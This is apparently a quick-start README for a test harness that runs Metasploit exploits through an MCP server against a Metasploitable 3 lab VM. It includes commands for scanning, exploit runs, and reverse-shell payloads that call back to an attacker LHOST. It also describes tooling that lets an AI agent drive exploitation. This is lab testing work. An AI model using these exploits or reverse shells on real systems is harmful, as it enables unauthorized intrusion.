# Quick Start: Testing MetasploitMCP with Metasploitable 3

## 5-Minute Setup Guide

This guide will get you testing MetasploitMCP against Metasploitable 3 in minutes.

## Prerequisites Check

```bash
# Check Python version (need 3.10+)
python3 --version

# Check Metasploit is installed
msfconsole --version

# Check Poetry is installed
poetry --version
```

## Step-by-Step Setup

### 1. Start Metasploit RPC (Terminal 1)

```bash
# Start the Metasploit RPC daemon
msfrpcd -P mysecretpassword -S -a 127.0.0.1 -p 55553

# You should see:
# [*] MSGRPC Service: 127.0.0.1:55553
# [*] MSGRPC Username: msf
# [*] MSGRPC Password: mysecretpassword
```

Keep this terminal open!

### 2. Configure Environment (Terminal 2)

```bash
cd /path/to/MetasploitMCP

# Set Metasploit RPC credentials
export MSF_PASSWORD=mysecretpassword
export MSF_SERVER=127.0.0.1
export MSF_PORT=55553

# Install dependencies if not already done
poetry install
```

### 3. Start MetasploitMCP Server (Same Terminal 2)

```bash
# Start the MCP server
poetry run python MetasploitMCP.py --transport http --host 127.0.0.1 --port 8085

# You should see:
# INFO - Successfully connected to Metasploit RPC at 127.0.0.1:55553
# INFO - Starting FastMCP HTTP server on http://127.0.0.1:8085
# INFO - MCP HTTP Endpoint: /mcp
```

Keep this terminal open too!

### 4. Prepare Metasploitable 3 VM

Ensure your Metasploitable 3 VM is running:

```bash
# Test connectivity
ping -c 3 10.0.2.15

# Verify services are up
nmap -sV -p 21,22,80,445,3306,3500,6697,8181 10.0.2.15
```

Expected output should show open ports like:
- 21/tcp (FTP - ProFTPD)
- 80/tcp (HTTP - Apache)
- 445/tcp (SMB - Samba)
- 3500/tcp (HTTP - Ruby)
- 6697/tcp (IRC - UnrealIRCd)
- etc.

### 5. Run the Test Harness (Terminal 3)

```bash
cd /path/to/MetasploitMCP

# List available tests
poetry run python metasploitable3_test_harness.py --list-tests

# Run all tests
poetry run python metasploitable3_test_harness.py \
    --target 10.0.2.15 \
    --lhost 10.0.2.4 \
    --lport 4444

# Or run a single test to verify setup
poetry run python metasploitable3_test_harness.py \
    --target 10.0.2.15 \
    --lhost 10.0.2.4 \
    --test "ProFTPD"
```

## Expected Output

### Successful Test

```
================================================================================
Testing: ProFTPD ModCopy Exec
Description: ProFTPD 1.3.5 Mod_Copy Command Execution
Module: exploit/unix/ftp/proftpd_modcopy_exec
Payload: cmd/unix/reverse_perl
================================================================================
Executing exploit...
Exploit execution result: {'success': True, 'data': 'Session 1 opened'}
Detected session ID: 1
✓ Test PASSED - Session established (ID: 1)

################################################################################
TEST SUMMARY
################################################################################

Total Tests: 1
Passed: 1 ✓
Failed: 0 ✗
Success Rate: 100.0%
Total Duration: 8.45s
```

## Network Configuration

### Important IP Addresses

- **Target IP** (`--target`): Metasploitable 3 VM IP (e.g., 10.0.2.15)
- **LHOST** (`--lhost`): Your attacking machine IP that the target can reach back to
- **LPORT** (`--lport`): Port for reverse connections (default: 4444)

### Finding Your LHOST

```bash
# On Linux/Mac
ifconfig | grep inet

# Find the interface that can reach Metasploitable 3
# Common scenarios:

# VirtualBox Host-Only: 192.168.56.x
# VirtualBox NAT Network: 10.0.2.x
# VMware: 192.168.x.x
```

### Test Connectivity

```bash
# From your machine to target
ping 10.0.2.15

# From Metasploitable 3 to your LHOST
# SSH into Metasploitable 3 first
ssh vagrant@10.0.2.15  # password: vagrant
ping 10.0.2.4  # Should work!
```

## Troubleshooting

### Issue: "Connection refused to http://127.0.0.1:8085"

**Solution**: MCP server is not running
```bash
# In Terminal 2, start the MCP server:
poetry run python MetasploitMCP.py --transport http --host 127.0.0.1 --port 8085
```

### Issue: "Failed to connect to Metasploit RPC"

**Solution**: Metasploit RPC is not running or wrong password
```bash
# In Terminal 1:
msfrpcd -P mysecretpassword -S -a 127.0.0.1 -p 55553

# In Terminal 2, ensure environment is set:
export MSF_PASSWORD=mysecretpassword
```

### Issue: "Exploit ran but no session detected"

**Possible causes**:
1. LHOST is wrong (target can't reach back)
2. Firewall is blocking
3. Service isn't vulnerable

**Solution**:
```bash
# Verify LHOST is reachable from target
# SSH to Metasploitable 3:
ssh vagrant@10.0.2.15

# From inside the VM, test connectivity:
ping YOUR_LHOST
nc -zv YOUR_LHOST 4444  # Should show connection
```

### Issue: Target not responding

**Solution**: 
```bash
# Verify VM is running
ping 10.0.2.15

# Verify services are up
nmap -p 21,80,6697 10.0.2.15

# If services are down, restart Metasploitable 3 VM
```

## Quick Command Reference

```bash
# List all available tests
poetry run python metasploitable3_test_harness.py --list-tests

# Run all tests
poetry run python metasploitable3_test_harness.py \
    --target 10.0.2.15 \
    --lhost 10.0.2.4

# Run specific test
poetry run python metasploitable3_test_harness.py \
    --target 10.0.2.15 \
    --lhost 10.0.2.4 \
    --test "ProFTPD"

# Verbose mode for debugging
poetry run python metasploitable3_test_harness.py \
    --target 10.0.2.15 \
    --lhost 10.0.2.4 \
    --verbose

# Stop on first failure
poetry run python metasploitable3_test_harness.py \
    --target 10.0.2.15 \
    --lhost 10.0.2.4 \
    --stop-on-failure
```

## What Gets Tested?

The harness tests these Metasploitable 3 vulnerabilities:

1. ✅ **ProFTPD** - FTP service command injection
2. ✅ **Shellshock** - Bash environment variable exploit
3. ✅ **Drupal** - SQL injection (Drupageddon)
4. ✅ **phpMyAdmin** - Authenticated RCE
5. ✅ **Ruby on Rails** - ERB template injection
6. ✅ **UnrealIRCd** - IRC backdoor

Each test:
- Executes the exploit through MCP
- Detects if a session is created
- Verifies the session by running `id` command
- Reports success/failure with timing

## Next Steps

1. **Review the full documentation**: [METASPLOITABLE3_TESTING.md](METASPLOITABLE3_TESTING.md)
2. **Add custom tests**: See "Extending the Harness" section
3. **Run unit tests**: 
   ```bash
   poetry run pytest tests/test_metasploitable3_harness.py -v
   ```
4. **Integrate into CI/CD**: See CI/CD Integration section

## Tips for Success

- ✅ Always verify network connectivity first
- ✅ Use verbose mode (`--verbose`) when debugging
- ✅ Start with a single test to verify setup
- ✅ Check Metasploit logs if exploits fail: `~/.msf4/logs/`
- ✅ Clean up sessions after testing (they persist!)

## Getting Help

If you encounter issues:

1. Check the troubleshooting section above
2. Enable verbose logging: `--verbose`
3. Review the full docs: [METASPLOITABLE3_TESTING.md](METASPLOITABLE3_TESTING.md)
4. Check MCP server logs for errors
5. Verify Metasploit RPC is working: 
   ```bash
   msfrpc -U msf -P mysecretpassword -a 127.0.0.1 -p 55553
   ```

## Security Reminder

⚠️ **WARNING**: This harness performs real exploitation attacks.

- ✅ Only use in authorized lab environments
- ✅ Never run against production systems
- ✅ Ensure proper isolation of testing networks
- ✅ You are responsible for ensuring authorization

---

**Happy Testing!** 🎯

